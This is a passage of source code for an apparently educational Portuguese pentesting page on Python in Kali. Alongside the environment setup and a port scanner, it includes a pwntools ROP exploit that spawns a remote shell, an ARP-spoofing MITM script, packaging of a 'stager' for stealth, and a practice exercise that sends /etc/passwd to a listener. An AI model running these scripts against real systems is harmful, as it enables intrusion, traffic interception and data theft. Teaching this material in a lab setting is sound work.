import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Python() {
  return (
    <PageContainer
      title="Python no Kali — a linguagem do pentester"
      subtitle="venv, pipx, requests, scapy, impacket, pwntools. Por que praticamente todo exploit moderno é Python."
      difficulty="intermediario"
      timeToRead="22 min"
    >
      <h2>Por que Python domina pentest</h2>
      <p>
        Sintaxe baixa-fricção, bibliotecas pra TUDO (scapy pra pacotes raw, impacket pra SMB/Kerberos,
        pwntools pra ROP/exploits, requests pra qualquer coisa HTTP), portabilidade entre Linux/Windows,
        e — crucial — <strong>preinstalado no Kali</strong>. Quase todo PoC publicado em CVE entre
        2018 e 2026 vem em Python. Saber escrever, ler, debugar e adaptar Python é requisito mínimo.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "python3 --version && which python3",
            out: `Python 3.12.7
/usr/bin/python3`,
            outType: "info",
          },
          {
            cmd: "python3 -c 'import sys; print(sys.path)'",
            out: `['', '/usr/lib/python312.zip', '/usr/lib/python3.12', '/usr/lib/python3.12/lib-dynload', '/usr/lib/python3/dist-packages']`,
            outType: "default",
          },
          {
            comment: "Kali 2024+ segue PEP-668: pip global é bloqueado",
            cmd: "pip install requests",
            out: `error: externally-managed-environment

× This environment is externally managed
╰─> To install Python packages system-wide, try apt install
    python3-xyz, where xyz is the package you are trying to
    install.

    If you wish to install a non-Debian-packaged Python package,
    create a virtual environment using python3 -m venv path/to/venv.`,
            outType: "error",
          },
        ]}
      />

      <h2>venv — ambientes isolados (o jeito certo)</h2>
      <Terminal
        path="~/exploits"
        lines={[
          {
            cmd: "python3 -m venv .venv",
            out: "(silencioso → cria .venv/ com python+pip dedicados)",
            outType: "muted",
          },
          {
            cmd: "source .venv/bin/activate",
            out: "(prompt muda: (.venv) ┌──(wallyson㉿kali)-[~/exploits])",
            outType: "info",
          },
          {
            cmd: "pip install requests beautifulsoup4 scapy",
            out: `Collecting requests
Collecting beautifulsoup4
Collecting scapy
Successfully installed beautifulsoup4-4.12.3 requests-2.32.3 scapy-2.5.0 ...`,
            outType: "success",
          },
          {
            cmd: "pip freeze > requirements.txt",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "deactivate",
            out: "(prompt volta ao normal)",
            outType: "default",
          },
          {
            comment: "amigo: rebuilda em outro lugar com mesmo lock",
            cmd: "python3 -m venv venv2 && venv2/bin/pip install -r requirements.txt",
            out: "Successfully installed beautifulsoup4-4.12.3 requests-2.32.3 scapy-2.5.0",
            outType: "info",
          },
        ]}
      />

      <h2>pipx — ferramentas como binários globais</h2>
      <p>
        Pra <strong>ferramentas</strong> (não bibliotecas), <code>pipx</code> instala cada uma em venv próprio
        e expõe o binário no PATH. Perfeito pra impacket-tools, crackmapexec, sherlock, theHarvester.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install pipx -y && pipx ensurepath",
            out: `Setting up pipx (1.6.0-1) ...
Success! Added /home/wallyson/.local/bin to PATH`,
            outType: "info",
          },
          {
            cmd: "pipx install impacket",
            out: `installed package impacket 0.12.0, installed using Python 3.12.7
  These apps are now globally available
    - GetADUsers.py
    - GetNPUsers.py
    - GetUserSPNs.py
    - secretsdump.py
    - psexec.py
    - smbserver.py
    - ticketer.py
    - wmiexec.py
    [...]
done! ✨ 🌟 ✨`,
            outType: "success",
          },
          {
            cmd: "pipx install crackmapexec",
            out: "installed package crackmapexec 5.4.0",
            outType: "success",
          },
          {
            cmd: "pipx list",
            out: `venvs are in /home/wallyson/.local/share/pipx/venvs
apps are exposed on your $PATH at /home/wallyson/.local/bin

  package crackmapexec 5.4.0
  package impacket 0.12.0
  package theharvester 4.6.0`,
            outType: "info",
          },
          {
            cmd: "pipx upgrade-all",
            out: "no upgrades or fresh installs needed (3 packages all up-to-date)",
            outType: "muted",
          },
        ]}
      />

      <h2>uv — gerenciador moderno (Rust, 10-100x mais rápido)</h2>
      <Terminal
        path="~/exploit-novo"
        lines={[
          {
            cmd: "curl -LsSf https://astral.sh/uv/install.sh | sh",
            out: "installing to /home/wallyson/.local/bin",
            outType: "info",
          },
          {
            cmd: "uv init && uv add requests scapy",
            out: `Initialized project at /home/wallyson/exploit-novo
Resolved 18 packages in 312ms
Downloaded 18 packages in 0.84s
Installed 18 packages in 21ms`,
            outType: "success",
          },
          {
            cmd: "uv run exploit.py",
            out: "(roda no venv automaticamente, sem source/activate)",
            outType: "default",
          },
        ]}
      />

      <h2>Bibliotecas-favoritas-do-pentester</h2>
      <CommandTable
        title="Pacotes essenciais"
        variations={[
          { cmd: "requests", desc: "HTTP cliente humano. Sessions, auth, proxies (Burp), verify=False.", output: "r = requests.get(url, proxies={'http':'http://127.0.0.1:8080'}, verify=False)" },
          { cmd: "scapy", desc: "Forjar/sniffar pacotes layer 2-7. Spoofing ARP, DNS, SYN scan.", output: "send(IP(dst='10.0.0.1')/ICMP())" },
          { cmd: "pwntools", desc: "Exploit dev: ELF parsing, ROP, format strings, shellcode.", output: "from pwn import *" },
          { cmd: "impacket", desc: "Implementação Python dos protocolos Windows (SMB, NTLM, Kerberos).", output: "GetUserSPNs.py, secretsdump.py" },
          { cmd: "paramiko", desc: "SSH cliente programável. Brute force, automação de sessões.", output: "ssh.connect(host, username, password)" },
          { cmd: "beautifulsoup4 + lxml", desc: "Parse HTML pra scraping/recon.", output: "soup.find_all('a', href=True)" },
          { cmd: "dnspython", desc: "Queries DNS programáticas (subdomain enum).", output: "dns.resolver.resolve('mx.target.com', 'MX')" },
          { cmd: "pycryptodome", desc: "AES, RSA, hashes. Decifrar cookies, dump credenciais.", output: "from Crypto.Cipher import AES" },
          { cmd: "ldap3", desc: "Pure-Python LDAP. Enum AD sem mexer em krb.", output: "Server, Connection, ALL_ATTRIBUTES" },
          { cmd: "rich", desc: "Tabelas/cores/progress no terminal. Faz seu script parecer ferramenta séria.", output: "from rich.console import Console" },
        ]}
      />

      <h2>Script-exemplo: scanner de portas com socket</h2>
      <CodeBlock
        language="python"
        title="port_scanner.py"
        code={`#!/usr/bin/env python3
"""Scanner TCP simples — base de qualquer ferramenta custom."""
import socket
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.table import Table

console = Console()


def scan_port(host: str, port: int, timeout: float = 0.6) -> tuple[int, bool, str]:
    """Tenta conectar; se OK, faz banner grab rápido."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        try:
            s.connect((host, port))
            banner = ""
            try:
                s.sendall(b"HEAD / HTTP/1.0\\r\\n\\r\\n")
                banner = s.recv(120).decode(errors="ignore").strip().split("\\n")[0]
            except Exception:
                pass
            return port, True, banner
        except (socket.timeout, ConnectionRefusedError, OSError):
            return port, False, ""


def scan(host: str, ports: range, workers: int = 200) -> list[tuple[int, str]]:
    abertos: list[tuple[int, str]] = []
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(scan_port, host, p): p for p in ports}
        for fut in as_completed(futures):
            port, ok, banner = fut.result()
            if ok:
                abertos.append((port, banner))
                console.print(f"[green][+][/green] {port}/tcp aberto  {banner}")
    return sorted(abertos)


def main() -> None:
    if len(sys.argv) < 2:
        console.print("[red]uso:[/red] port_scanner.py <host> [start-end]")
        sys.exit(1)
    host = sys.argv[1]
    rng = sys.argv[2] if len(sys.argv) > 2 else "1-1024"
    start, end = (int(x) for x in rng.split("-"))

    console.rule(f"[cyan]Scan {host} :: portas {start}-{end}[/cyan]")
    abertos = scan(host, range(start, end + 1))

    table = Table(title="Resumo")
    table.add_column("Porta", style="cyan", justify="right")
    table.add_column("Banner", style="yellow")
    for porta, banner in abertos:
        table.add_row(str(porta), banner or "—")
    console.print(table)


if __name__ == "__main__":
    main()`}
      />

      <Terminal
        path="~/exploits"
        lines={[
          {
            cmd: "python3 port_scanner.py 10.10.10.50 20-100",
            out: `─────────────────────── Scan 10.10.10.50 :: portas 20-100 ───────────────────────
[+] 22/tcp aberto  SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
[+] 80/tcp aberto  HTTP/1.1 200 OK
                            Resumo
┏━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Porta ┃ Banner                                          ┃
┡━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│    22 │ SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10        │
│    80 │ HTTP/1.1 200 OK                                  │
└───────┴─────────────────────────────────────────────────┘`,
            outType: "success",
          },
        ]}
      />

      <h2>pwntools — exploit dev em 10 linhas</h2>
      <CodeBlock
        language="python"
        title="exploit.py (buffer overflow clássico)"
        code={`#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./vuln")
context.log_level = "info"

# Encontra offset com cyclic
# offset = cyclic_find(0x6161616a)  # → 72
OFFSET = 72

# Endereços extraídos do binário
win = elf.symbols["win"]
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main = elf.symbols["main"]

# ROP simples pra leak de libc + retornar pra main
rop = ROP(elf)
rop.call(puts_plt, [puts_got])
rop.call(main)

payload = b"A" * OFFSET + bytes(rop)

p = remote("10.10.10.50", 9999)
p.sendlineafter(b"name: ", payload)

# Recebe leak
leak = u64(p.recvline().strip().ljust(8, b"\\x00"))
log.success(f"puts@libc = {hex(leak)}")

libc = ELF("./libc.so.6")
libc.address = leak - libc.symbols["puts"]
log.info(f"libc base = {hex(libc.address)}")

# Round 2: shell via system("/bin/sh")
rop2 = ROP(libc)
rop2.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\\x00"))])
p.sendlineafter(b"name: ", b"A" * OFFSET + bytes(rop2))

p.interactive()`}
      />

      <h2>Scapy — pacotes na mão</h2>
      <CodeBlock
        language="python"
        title="arp_spoof.py"
        code={`#!/usr/bin/env python3
"""ARP spoof MITM educacional. Use SÓ no seu lab."""
from scapy.all import ARP, send, getmacbyip
import time, sys

vitima_ip = sys.argv[1]
gateway_ip = sys.argv[2]
iface = sys.argv[3] if len(sys.argv) > 3 else "eth0"

vitima_mac = getmacbyip(vitima_ip)
gateway_mac = getmacbyip(gateway_ip)
print(f"[+] vítima  = {vitima_ip} / {vitima_mac}")
print(f"[+] gateway = {gateway_ip} / {gateway_mac}")

try:
    while True:
        # Diz pra vítima que VOCÊ é o gateway
        send(ARP(op=2, pdst=vitima_ip, hwdst=vitima_mac, psrc=gateway_ip),
             verbose=False, iface=iface)
        # Diz pro gateway que VOCÊ é a vítima
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=vitima_ip),
             verbose=False, iface=iface)
        time.sleep(2)
except KeyboardInterrupt:
    print("\\n[*] restaurando ARP...")
    send(ARP(op=2, pdst=vitima_ip, hwdst=vitima_mac,
             psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False, iface=iface)`}
      />

      <h2>Debugging</h2>
      <CommandTable
        title="Ferramentas de debug Python"
        variations={[
          { cmd: "python3 -m pdb script.py", desc: "Debugger interativo nativo (n=next, s=step, c=continue, l=list, p var).", output: "(Pdb)" },
          { cmd: "breakpoint()", desc: "Insere pdb no ponto onde for chamado (Python 3.7+).", output: "Stop ali e cai no shell." },
          { cmd: "pip install ipdb && import ipdb; ipdb.set_trace()", desc: "PDB com cores/autocomplete.", output: "Muito mais agradável." },
          { cmd: "python3 -X dev script.py", desc: "Modo dev: warnings ativos, asyncio debug.", output: "Pega bugs sutis cedo." },
          { cmd: "python3 -m trace --trace script.py", desc: "Mostra TODA linha executada.", output: "Útil pra entender script alheio." },
          { cmd: "python3 -m timeit \"sum(range(1000))\"", desc: "Microbenchmark.", output: "10000 loops, best of 5: 18.2 usec per loop" },
        ]}
      />

      <h2>Empacotar pra enviar ao alvo</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "PyInstaller: gera binário standalone (Windows/Linux)",
            cmd: "pip install pyinstaller && pyinstaller --onefile --noconsole stager.py",
            out: `INFO: PyInstaller: 6.10.0
INFO: Building EXE from EXE-00.toc completed successfully.
dist/stager (12.4 MB)`,
            outType: "info",
          },
          {
            comment: "Nuitka: compila pra C, mais leve, mais furtivo",
            cmd: "pip install nuitka && python3 -m nuitka --standalone --onefile stager.py",
            out: "Nuitka:INFO: Successfully created 'stager.bin'.",
            outType: "success",
          },
          {
            comment: "shiv: zipfile autônomo (precisa Python no alvo, mas leve)",
            cmd: "pip install shiv && shiv -c meucli -o tool.pyz .",
            out: "(silencioso)",
            outType: "muted",
          },
        ]}
      />

      <PracticeBox
        title="Exfil HTTP em 15 linhas"
        goal="Escrever cliente Python que coleta /etc/passwd e POSTa pra seu listener — base de stager."
        steps={[
          "Crie venv e instale requests.",
          "Escreva o exfiltrator.",
          "No outro terminal, suba listener Python pra receber.",
          "Rode e veja a saída no listener.",
        ]}
        command={`python3 -m venv .venv && source .venv/bin/activate && pip install requests
cat > exfil.py <<'EOF'
import requests, base64
with open("/etc/passwd","rb") as f:
    data = base64.b64encode(f.read()).decode()
requests.post("http://10.10.0.5:8000/loot", json={"host":"victim","data":data})
print("[+] enviado")
EOF
# em outra aba: python3 -m http.server 8000 &
python3 exfil.py`}
        expected={`[+] enviado
# no listener:
10.10.0.7 - - [03/Apr/2026 22:14:01] "POST /loot HTTP/1.1" 501 -`}
        verify="O listener mostra POST chegando. Em pentest real, troque http.server por Flask/FastAPI handler."
      />

      <AlertBox type="info" title="Onde aprender mais">
        Leia os PoCs do <a href="https://github.com/SecureAuthCorp/impacket/tree/master/examples">impacket/examples</a>
        — é a melhor escola de Python ofensivo no mundo real (SMB, Kerberos, DCERPC tudo em pure Python).
      </AlertBox>
    </PageContainer>
  );
}
